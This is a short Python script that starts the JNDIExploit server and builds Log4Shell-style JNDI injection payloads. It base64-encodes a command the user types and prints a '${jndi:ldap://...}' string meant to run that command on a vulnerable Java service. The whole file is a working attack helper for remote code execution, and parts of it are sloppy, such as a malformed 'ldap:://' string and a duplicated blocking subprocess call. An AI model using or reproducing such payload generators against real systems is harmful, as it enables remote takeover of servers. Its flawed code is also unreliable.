import subprocess,os,sys,base64
command=["C:\\Program Files\\Java\\jdk1.8.0_301\\bin\\java","-jar","JNDIExploit-1.2-SNAPSHOT.jar","--ip","127.0.0.1","-p","8000"]
subp = subprocess.call(" ".join(command)+" -u")

print("Generate:${jndi:ldap:://127.0.0.1/} ")
Command = base64.b64encode(raw_input("Input Command:"))
print("Test Payload:${jndi:ldap://127.0.0.1:1389/Basic/Command/Base64/%s}"%Command)
subp = subprocess.call(command)




